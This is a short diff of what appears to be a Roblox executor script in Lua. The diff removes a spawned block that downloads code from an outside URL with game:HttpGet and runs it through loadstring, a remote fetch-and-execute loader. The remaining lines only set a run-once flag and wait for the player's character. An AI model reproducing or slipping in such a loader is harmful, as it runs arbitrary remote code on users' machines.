@@ -12,11 +12,6 @@ if getgenv().CokkaRan then
 end
 getgenv().CokkaRan=true
 
-
-spawn(function()
-	loadstring(game:HttpGet("https://you.whimper.xyz/cute"))()
-end)
-
 local player = game:GetService("Players").LocalPlayer
 while not player.Character do
     task.wait(3)
